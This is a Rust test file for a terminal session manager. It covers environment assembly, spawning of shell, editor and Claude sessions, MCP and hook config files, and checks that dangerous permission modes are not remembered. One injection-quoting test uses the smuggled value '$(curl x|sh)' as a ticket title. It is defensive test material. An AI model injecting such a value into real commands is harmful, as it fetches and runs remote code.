//! SpawnRequest → PtySpawnSpec: env assembly (insta snapshot), program resolution, scrollback by
//! kind, per-session tokens, standalone Claude template files.

use std::collections::BTreeMap;
use std::path::Path;

use crate::common::*;
use kelta_core::spawn_env::{EnvInputs, assemble_env};
use kelta_proto::api::CoreApi;
use kelta_proto::ids::ProjectId;
use kelta_proto::model::{Placement, SessionKind, SpawnRequest, TemplateCtx};
use kelta_proto::settings::Settings;

fn map(pairs: &[(&str, &str)]) -> BTreeMap<String, String> {
    pairs.iter().map(|(k, v)| ((*k).to_owned(), (*v).to_owned())).collect()
}

#[test]
fn env_assembly_snapshot() {
    let login = map(&[
        ("PATH", "/usr/local/bin:/usr/bin"),
        ("HOME", "/home/ada"),
        ("SHELL", "/bin/zsh"),
        ("TERM", "dumb"),
        ("TERM_PROGRAM", "iTerm.app"),
        ("KELTA_TICKET", "STALE-1"),
        ("TERMINFO", "/usr/share/terminfo"),
        ("EDITOR", "vi"),
    ]);
    let env = assemble_env(&EnvInputs {
        login: &login,
        terminal_env: &map(&[("EDITOR", "nvim"), ("FOO", "terminal")]),
        project_env: &map(&[("FOO", "project"), ("DATABASE_URL", "postgres://localhost/shop_dev")]),
        request_env: &map(&[("FOO", "request")]),
        version: "0.1.0",
        session_id: "01928f6e-2b4c-7a10-9c3d-5e6f70819203",
        project_id: "shop",
        ctl_sock: Path::new("/tmp/kelta-501/ctl.sock"),
        hook_token: "00112233445566778899aabbccddeeff",
        ticket: Some("SHOP-142"),
        mcp_token: Some("ffeeddccbbaa99887766554433221100"),
        mcp_url: None,
    });
    insta::assert_json_snapshot!("spawn_env", env);
}

fn req(kind: SessionKind, program: Option<&str>, args: &[&str]) -> SpawnRequest {
    SpawnRequest {
        id: None,
        project_id: ProjectId::new("shop"),
        kind,
        name: None,
        program: program.map(str::to_owned),
        args: args.iter().map(|s| (*s).to_owned()).collect(),
        cwd: None,
        env: map(&[("REQ", "1")]),
        cols: 120,
        rows: 40,
        work_item_id: None,
        restore: Default::default(),
        close_on_exit: Default::default(),
        template_id: None,
    }
}

#[tokio::test]
async fn work_item_sessions_get_the_port_block_and_compose_namespace() {
    let tmp = tempfile::tempdir().unwrap();
    let h = start(tmp.path(), Settings::defaults(), vec![project("shop", tmp.path())]);
    let item = kelta_proto::samples::work_item();
    let it = item.clone();
    h.core.store().call(move |c| kelta_core::store::q::work_put(c, &it)).await.unwrap();
    let mut r = req(SessionKind::Shell, None, &[]);
    r.work_item_id = Some(item.id.clone());
    let s = h.core.session_spawn(r).await.unwrap();
    let env = h.term.with_session(&s.id, |s| s.spec.env.clone()).unwrap();
    assert_eq!(env["KELTA_PORT"], "20140");
    assert_eq!(env["KELTA_PORT_1"], "20141");
    assert_eq!(env["KELTA_PORT_9"], "20149");
    assert_eq!(env["COMPOSE_PROJECT_NAME"], "kelta-shop-142");
    assert_eq!(env["KELTA_TICKET"], "SHOP-142");
}

#[tokio::test]
async fn spawn_builds_the_pty_spec() {
    let tmp = tempfile::tempdir().unwrap();
    let mut settings = Settings::defaults();
    settings.terminal.env = map(&[("FROM_TERMINAL", "1")]);
    let h = start(tmp.path(), settings, vec![project("shop", tmp.path())]);
    h.cfg.env.write().insert(ProjectId::new("shop"), map(&[("FROM_PROJECT", "1")]));

    let shell = h.core.session_spawn(req(SessionKind::Shell, None, &[])).await.unwrap();
    let (program, args, env, scrollback, cwd) = h
        .term
        .with_session(&shell.id, |s| {
            (
                s.spec.program.clone(),
                s.spec.args.clone(),
                s.spec.env.clone(),
                s.spec.scrollback_lines,
                s.spec.cwd.clone(),
            )
        })
        .unwrap();
    assert_eq!(program, Path::new("/bin/sh"));
    assert_eq!(args, vec!["-l".to_owned()]);
    assert_eq!(scrollback, 3000);
    assert!(cwd.ends_with("repos/shop"));
    assert_eq!(env["KELTA_SESSION_ID"], shell.id.as_str());
    assert_eq!(env["KELTA_PROJECT_ID"], "shop");
    assert_eq!(env["TERM"], "xterm-256color");
    assert_eq!(env["FROM_TERMINAL"], "1");
    assert_eq!(env["FROM_PROJECT"], "1");
    assert_eq!(env["REQ"], "1");
    assert_eq!(env["LANG"], "en_US.UTF-8");
    assert_eq!(env["KELTA_HOOK_TOKEN"].len(), 32);
    assert!(!env.contains_key("KELTA_TICKET"), "inherited KELTA_* vars must not leak");
    assert!(!env.contains_key("KELTA_MCP_TOKEN"));
    assert!(env["KELTA_SOCK"].ends_with("run/ctl.sock"));

    let editor = h
        .core
        .session_spawn(req(
            SessionKind::Editor { adapter: "nvim".into() },
            Some("nvim"),
            &["--listen", "/tmp/x.sock", "."],
        ))
        .await
        .unwrap();
    let (program, scrollback) =
        h.term.with_session(&editor.id, |s| (s.spec.program.clone(), s.spec.scrollback_lines)).unwrap();
    assert!(program.ends_with("bin/nvim") && program.is_absolute());
    assert_eq!(scrollback, 500);
    assert_eq!(editor.editor.as_ref().and_then(|e| e.socket.clone()).unwrap(), Path::new("/tmp/x.sock"));

    let claude = h.core.session_spawn(req(SessionKind::Claude, Some("claude"), &["-n", "x"])).await.unwrap();
    let (args, env) = h.term.with_session(&claude.id, |s| (s.spec.args.clone(), s.spec.env.clone())).unwrap();
    let uuid = claude.claude.as_ref().unwrap().session_uuid.clone();
    assert_eq!(args[..2], ["--session-id".to_owned(), uuid]);
    assert_eq!(env["KELTA_MCP_TOKEN"].len(), 32);
    assert_ne!(env["KELTA_MCP_TOKEN"], env["KELTA_HOOK_TOKEN"]);

    let missing = h
        .core
        .session_spawn(req(SessionKind::Tool { tool_id: "nope".into() }, Some("definitely-not-here"), &[]))
        .await
        .unwrap_err();
    assert_eq!(missing.code, kelta_proto::ErrorCode::NotFound);
    assert!(missing.detail.is_some());
    let bad_project =
        SpawnRequest { project_id: ProjectId::new("ghost"), ..req(SessionKind::Shell, None, &[]) };
    assert_eq!(h.core.session_spawn(bad_project).await.unwrap_err().code, kelta_proto::ErrorCode::NotFound);
}

#[tokio::test]
async fn template_spawns_a_tab_with_claude_hooks() {
    let tmp = tempfile::tempdir().unwrap();
    let h = start(tmp.path(), Settings::defaults(), vec![project("shop", tmp.path())]);
    let shop = ProjectId::new("shop");
    let spawned = h
        .core
        .session_spawn_template(&shop, "claude+editor", TemplateCtx::default(), Placement::NewTab)
        .await
        .unwrap();
    assert_eq!(spawned.len(), 2);
    assert!(matches!(spawned[0].kind, SessionKind::Claude));
    assert!(matches!(&spawned[1].kind, SessionKind::Editor { adapter } if adapter == "nvim"));
    let args = h.term.with_session(&spawned[0].id, |s| s.spec.args.clone()).unwrap();
    assert!(!args.iter().any(|a| a.contains("{task}")), "plain session must not get a prompt: {args:?}");
    let file = args.iter().position(|a| a == "--settings").map(|i| args[i + 1].clone()).unwrap();
    let hooks: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(&file).unwrap()).unwrap();
    assert!(hooks["hooks"]["SessionStart"].is_array());
    use std::os::unix::fs::PermissionsExt;
    assert_eq!(std::fs::metadata(&file).unwrap().permissions().mode() & 0o777, 0o600);
    let nvim_args = h.term.with_session(&spawned[1].id, |s| s.spec.args.clone()).unwrap();
    assert_eq!(nvim_args[0], "--listen");
    assert!(nvim_args[1].ends_with(&format!("s/{}/nvim.sock", spawned[1].id.sid8())));

    let layout = h.core.layout_get(&shop).unwrap();
    assert_eq!(layout.tabs.len(), 1);
    assert_eq!(layout.tabs[0].title, "Claude + editor");
    assert_eq!(
        kelta_core::layout::layout_sessions(&layout),
        vec![spawned[0].id.clone(), spawned[1].id.clone()]
    );
    assert!(h.ui.event_names().contains(&"layout.changed"));
    assert_eq!(
        h.core
            .session_spawn_template(&shop, "nope", TemplateCtx::default(), Placement::NewTab)
            .await
            .unwrap_err()
            .code,
        kelta_proto::ErrorCode::NotFound
    );
}

/// #496: a `⌘T` Claude has its own `mcp.json` (its MCP calls reach `/mcp/<sid>`); off with `claude.mcp`.
#[tokio::test]
async fn a_plain_claude_tab_gets_its_own_mcp_json() {
    let tmp = tempfile::tempdir().unwrap();
    let h = start(tmp.path(), Settings::defaults(), vec![project("shop", tmp.path())]);
    let shop = ProjectId::new("shop");
    let spawn =
        || h.core.session_spawn_template(&shop, "claude+editor", TemplateCtx::default(), Placement::NewTab);
    let claude = spawn().await.unwrap().remove(0);
    let args = h.term.with_session(&claude.id, |s| s.spec.args.clone()).unwrap();
    let at = args.iter().position(|a| a == "--mcp-config").expect("--mcp-config");
    let mcp: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&args[at + 1]).unwrap()).unwrap();
    let url = mcp["mcpServers"]["kelta"]["url"].as_str().unwrap();
    assert!(url.ends_with(&format!("/mcp/{}", claude.id)), "{mcp}");

    h.cfg.update(|s| s.claude.mcp = false);
    let off = spawn().await.unwrap().remove(0);
    let args = h.term.with_session(&off.id, |s| s.spec.args.clone()).unwrap();
    assert!(!args.iter().any(|a| a == "--mcp-config"), "{args:?}");
    assert!(!h.core.dirs().session_runtime(&off.id.sid8()).join("mcp.json").exists());
}

/// #277: a Claude session starts in the last mode a session switched to, kept across restarts; a
/// mode Kelta forced at launch (plan) is not remembered. #304: neither are the dangerous modes, and a
/// resumed session drops its launch-time mode for the remembered one.
#[tokio::test]
async fn claude_sessions_start_in_the_last_permission_mode() {
    use kelta_proto::hooks::HookPayload;
    use kelta_proto::settings::PermissionMode;
    let tmp = tempfile::tempdir().unwrap();
    let shop = ProjectId::new("shop");
    let mode_arg = |h: &H, id| {
        let args = h.term.with_session(id, |s| s.spec.args.clone()).unwrap();
        args.windows(2).find(|w| w[0] == "--permission-mode").map(|w| w[1].clone())
    };
    let hook = |h: &H, id, mode: &str| {
        let mut p = HookPayload { hook_event_name: "Stop".into(), ..Default::default() };
        p.extra.insert("permission_mode".into(), mode.into());
        h.core.session_claude_runs_hook(id, &p);
    };
    {
        let h = start(tmp.path(), Settings::defaults(), vec![project("shop", tmp.path())]);
        let spawn = || {
            h.core.session_spawn_template(&shop, "claude+editor", TemplateCtx::default(), Placement::NewTab)
        };
        let hr = &h;
        let resume = move |id| async move {
            hr.term.emit(id, kelta_proto::term::TerminalEvent::Exited { code: Some(0), signal: None });
            settle().await;
            hr.core.session_restart(id).await.unwrap();
        };
        let old = h
            .core
            .session_spawn(req(
                SessionKind::Claude,
                Some("claude"),
                &["--session-id", "U-1", "--permission-mode", "acceptEdits"],
            ))
            .await
            .unwrap();
        resume(&old.id).await;
        assert_eq!(mode_arg(&h, &old.id), None, "resumed, nothing remembered: no flag");
        let first = spawn().await.unwrap();
        assert_eq!(mode_arg(&h, &first[0].id), None, "nothing remembered: Claude's own default");
        hook(&h, &first[0].id, "auto");
        assert_eq!(h.core.claude_permission_mode(), Some(PermissionMode::Auto));
        let next = spawn().await.unwrap();
        assert_eq!(mode_arg(&h, &next[0].id).as_deref(), Some("auto"));
        hook(&h, &next[0].id, "bypassPermissions");
        hook(&h, &next[0].id, "dontAsk");
        assert_eq!(h.core.claude_permission_mode(), Some(PermissionMode::Auto), "dangerous modes stay put");
        resume(&old.id).await;
        assert_eq!(mode_arg(&h, &old.id).as_deref(), Some("auto"), "resumed in the remembered mode");

        let planned = h
            .core
            .session_spawn(req(SessionKind::Claude, Some("claude"), &["--permission-mode", "plan"]))
            .await
            .unwrap();
        hook(&h, &planned.id, "plan");
        assert_eq!(
            h.core.claude_permission_mode(),
            Some(PermissionMode::Auto),
            "a forced mode is not a choice"
        );
        hook(&h, &planned.id, "acceptEdits");
        hook(&h, &first[0].id, "auto");
        assert_eq!(
            h.core.claude_permission_mode(),
            Some(PermissionMode::AcceptEdits),
            "unchanged sessions repeat"
        );
        h.core.store().flush().await.unwrap();
        h.core.shutdown().await.unwrap();
    }
    let h = start(tmp.path(), Settings::defaults(), vec![project("shop", tmp.path())]);
    assert_eq!(h.core.claude_permission_mode(), Some(PermissionMode::AcceptEdits));
}

/// #318: a resume re-reads the mode from where the launch took it: the profile's forced mode is kept
/// (across a quit too), a remembered one gives way to the current remembered mode.
#[tokio::test]
async fn resumed_claude_takes_its_mode_from_its_launch_source() {
    use kelta_proto::hooks::HookPayload;
    use kelta_proto::settings::{PermissionMode, SessionTemplate, TemplateNode};
    let tmp = tempfile::tempdir().unwrap();
    let shop = ProjectId::new("shop");
    let mut settings = Settings::defaults();
    settings.claude.profiles.get_mut("review").unwrap().permission_mode = Some(PermissionMode::AcceptEdits);
    settings.session_templates.push(SessionTemplate {
        id: "edits".into(),
        label: "Edits".into(),
        layout: TemplateNode::Session {
            session: "claude".into(),
            name: None,
            profile: Some("review".into()),
            command: None,
        },
        options: Vec::new(),
        ..Default::default()
    });
    let mode_arg = |h: &H, id: &kelta_proto::ids::SessionId| {
        let args = h.term.with_session(id, |s| s.spec.args.clone()).unwrap();
        args.windows(2).find(|w| w[0] == "--permission-mode").map(|w| w[1].clone())
    };
    let hook = |h: &H, id: &kelta_proto::ids::SessionId, mode: &str| {
        let mut p = HookPayload { hook_event_name: "Stop".into(), ..Default::default() };
        p.extra.insert("permission_mode".into(), mode.into());
        h.core.session_claude_runs_hook(id, &p);
    };
    let edits = {
        let h = start(tmp.path(), settings.clone(), vec![project("shop", tmp.path())]);
        let spawn = |t| h.core.session_spawn_template(&shop, t, TemplateCtx::default(), Placement::NewTab);
        let a = spawn("claude+editor").await.unwrap()[0].id.clone();
        hook(&h, &a, "plan");
        let b = spawn("claude+editor").await.unwrap()[0].id.clone();
        assert_eq!(mode_arg(&h, &b).as_deref(), Some("plan"), "launched in the remembered plan");
        hook(&h, &a, "auto");
        h.term.emit(&b, kelta_proto::term::TerminalEvent::Exited { code: Some(0), signal: None });
        settle().await;
        h.core.session_restart(&b).await.unwrap();
        assert_eq!(
            mode_arg(&h, &b).as_deref(),
            Some("auto"),
            "a remembered plan follows the remembered mode"
        );
        let edits = spawn("edits").await.unwrap()[0].id.clone();
        assert_eq!(mode_arg(&h, &edits).as_deref(), Some("acceptEdits"));
        h.core.store().flush().await.unwrap();
        h.core.shutdown().await.unwrap();
        edits
    };
    let h = start(tmp.path(), settings, vec![project("shop", tmp.path())]);
    h.core.session_restart(&edits).await.unwrap();
    assert_eq!(mode_arg(&h, &edits).as_deref(), Some("acceptEdits"), "the profile's mode is kept");
    assert_eq!(h.core.claude_permission_mode(), Some(PermissionMode::Auto));
}

#[tokio::test]
async fn stored_dangerous_permission_mode_is_not_loaded() {
    let tmp = tempfile::tempdir().unwrap();
    {
        let h = start(tmp.path(), Settings::defaults(), vec![]);
        h.core
            .store()
            .call(|c| kelta_core::store::q::ui_state_set(c, "claude.permission_mode", "bypassPermissions"))
            .await
            .unwrap();
        h.core.store().flush().await.unwrap();
        h.core.shutdown().await.unwrap();
    }
    let h = start(tmp.path(), Settings::defaults(), vec![]);
    assert_eq!(h.core.claude_permission_mode(), None);
}

#[tokio::test]
async fn template_shell_command_quotes_placeholders() {
    let tmp = tempfile::tempdir().unwrap();
    let mut settings = Settings::defaults();
    settings.session_templates.push(kelta_proto::settings::SessionTemplate {
        id: "log".into(),
        label: "Log".into(),
        layout: kelta_proto::settings::TemplateNode::Session {
            session: "shell".into(),
            name: None,
            profile: None,
            command: Some("git log --grep {ticket.title} {base|shell}".into()),
        },
        options: Vec::new(),
        ..Default::default()
    });
    let h = start(tmp.path(), settings, vec![project("shop", tmp.path())]);
    let shop = ProjectId::new("shop");
    // a third-party ticket title must not run as shell code
    let ctx = TemplateCtx { extra: map(&[("title", "$(curl x|sh)")]), ..TemplateCtx::default() };
    let spawned = h.core.session_spawn_template(&shop, "log", ctx, Placement::NewTab).await.unwrap();
    let typed = String::from_utf8(h.term.written(&spawned[0].id)).unwrap();
    assert_eq!(typed, "git log --grep '$(curl x|sh)' 'main'\r");
}

#[tokio::test]
async fn spawn_uses_the_requested_id_once() {
    let tmp = tempfile::tempdir().unwrap();
    let h = start(tmp.path(), Settings::defaults(), vec![project("shop", tmp.path())]);
    let id = kelta_proto::ids::SessionId::generate();
    let mut r = req(SessionKind::Shell, None, &[]);
    r.id = Some(id.clone());
    // a failed spawn does not burn the id
    let mut bad = r.clone();
    bad.project_id = ProjectId::new("nope");
    assert!(h.core.session_spawn(bad).await.is_err());
    assert_eq!(h.core.session_spawn(r.clone()).await.unwrap().id, id);
    let err = h.core.session_spawn(r.clone()).await.unwrap_err();
    assert_eq!(err.code, kelta_proto::error::ErrorCode::Conflict);
    r.id = Some(kelta_proto::ids::SessionId::new("not-a-uuid"));
    let err = h.core.session_spawn(r).await.unwrap_err();
    assert_eq!(err.code, kelta_proto::error::ErrorCode::InvalidArgument);
}

#[tokio::test]
async fn work_updated_reaches_the_ui() {
    let tmp = tempfile::tempdir().unwrap();
    let h = start(tmp.path(), Settings::defaults(), vec![project("shop", tmp.path())]);
    let work = kelta_proto::samples::work_item();
    h.core.publish(kelta_proto::events::BusEvent::new(
        kelta_proto::events::bus::WORK_UPDATED,
        serde_json::json!({ "work": work }),
    ));
    assert!(h.ui.events().iter().any(|e| matches!(e,
        kelta_proto::events::UiEvent::WorkUpdated { work: w } if w.id == work.id)));
}

#[tokio::test]
async fn ticket_step_reaches_the_ui() {
    let tmp = tempfile::tempdir().unwrap();
    let h = start(tmp.path(), Settings::defaults(), vec![project("shop", tmp.path())]);
    let row = kelta_proto::model::TicketStep {
        ticket: kelta_proto::samples::ticket_ref(),
        source_id: None,
        step_id: "pr".into(),
        entered_at: "2026-10-16T10:00:00Z".into(),
        by: "\"pr_opened\"".into(),
    };
    h.core.publish(kelta_proto::events::BusEvent::new(
        kelta_proto::events::bus::TICKET_STEP,
        serde_json::json!(row),
    ));
    assert!(h.ui.events().iter().any(|e| matches!(e,
        kelta_proto::events::UiEvent::TicketStep { step } if **step == row)));
}

#[tokio::test]
async fn claude_ide_bridge_follows_the_setting() {
    let tmp = tempfile::tempdir().unwrap();
    let h = start(tmp.path(), Settings::defaults(), vec![project("shop", tmp.path())]);
    let env_of = |id| h.term.with_session(id, |s| s.spec.env.clone()).unwrap();

    // Off (default): no env, no lock file under the (temp) HOME.
    let off = h.core.session_spawn(req(SessionKind::Claude, Some("claude"), &[])).await.unwrap();
    let env = env_of(&off.id);
    assert!(!env.contains_key("CLAUDE_CODE_SSE_PORT") && !env.contains_key("ENABLE_IDE_INTEGRATION"));
    assert!(!tmp.path().join("home/.claude").exists());

    // On: the lock goes under the session's own CLAUDE_CONFIG_DIR and goes away with the session.
    h.cfg.update(|s| s.claude.ide_bridge = true);
    let cfg_dir = tmp.path().join("claude-cfg");
    let mut r = req(SessionKind::Claude, Some("claude"), &[]);
    r.env.insert("CLAUDE_CONFIG_DIR".into(), cfg_dir.display().to_string());
    let on = h.core.session_spawn(r).await.unwrap();
    let env = env_of(&on.id);
    assert_eq!(env["ENABLE_IDE_INTEGRATION"], "true");
    let lock = cfg_dir.join("ide").join(format!("{}.lock", env["CLAUDE_CODE_SSE_PORT"]));
    let l: serde_json::Value = serde_json::from_slice(&std::fs::read(&lock).unwrap()).unwrap();
    assert_eq!(l["workspaceFolders"], serde_json::json!([on.cwd]));
    // Shells never get a bridge.
    let shell = h.core.session_spawn(req(SessionKind::Shell, None, &[])).await.unwrap();
    assert!(!env_of(&shell.id).contains_key("CLAUDE_CODE_SSE_PORT"));

    h.core.session_kill(&on.id, false).await.unwrap();
    assert!(!lock.exists(), "lock file removed when the session ends");
}

#[tokio::test]
async fn template_claude_host_wraps_claude_and_keeps_the_host_on_restart() {
    use kelta_proto::settings::{ClaudeHost, SessionTemplate, TemplateNode};
    let tmp = tempfile::tempdir().unwrap();
    let shop = ProjectId::new("shop");
    let mut settings = Settings::defaults();
    settings.session_templates.push(SessionTemplate {
        id: "outside".into(),
        label: "Outside".into(),
        layout: TemplateNode::session("claude"),
        claude_host: ClaudeHost::Terminal,
        ..Default::default()
    });
    let h = start(tmp.path(), settings, vec![project("shop", tmp.path())]);
    let wrapped = |id: &kelta_proto::ids::SessionId| {
        h.term.with_session(id, |s| {
            s.spec.program.ends_with("sh")
                && s.spec.args.get(1).is_some_and(|a| a.contains("external terminal"))
        })
    };
    let spawned =
        h.core.session_spawn_template(&shop, "outside", TemplateCtx::default(), Placement::NewTab).await;
    let info = spawned.unwrap()[0].clone();
    assert_eq!(info.claude.as_ref().and_then(|c| c.host), Some(ClaudeHost::Terminal));
    assert_eq!(wrapped(&info.id), Some(true));
    let script = h.core.dirs().session_runtime(&info.id.sid8()).join("claude.command");
    let text = std::fs::read_to_string(script).unwrap();
    assert!(text.contains(&format!("export KELTA_SESSION_ID='{}'", info.id)), "{text}");
    h.term.emit(&info.id, kelta_proto::term::TerminalEvent::Exited { code: Some(0), signal: None });
    settle().await;
    h.core.session_restart(&info.id).await.unwrap();
    assert_eq!(wrapped(&info.id), Some(true), "restarted in the same host");

    let plain =
        h.core.session_spawn_template(&shop, "claude", TemplateCtx::default(), Placement::NewTab).await;
    let plain = plain.unwrap()[0].clone();
    assert_eq!(plain.claude.as_ref().and_then(|c| c.host), None);
    assert_eq!(wrapped(&plain.id), Some(false), "builtin stays a plain claude");
}

#[tokio::test]
async fn claude_config_dir_follows_the_project_env() {
    let tmp = tempfile::tempdir().unwrap();
    let h = start(tmp.path(), Settings::defaults(), vec![project("shop", tmp.path())]);
    let home = tmp.path().join("home");
    assert_eq!(h.core.claude_config_dir(None), Some(home.join(".claude")));
    h.cfg.env.write().insert(ProjectId::new("shop"), map(&[("CLAUDE_CONFIG_DIR", "~/.claude-work")]));
    assert_eq!(h.core.claude_config_dir(Some(&ProjectId::new("shop"))), Some(home.join(".claude-work")));
    assert_eq!(h.core.claude_config_dir(None), Some(home.join(".claude")));
}
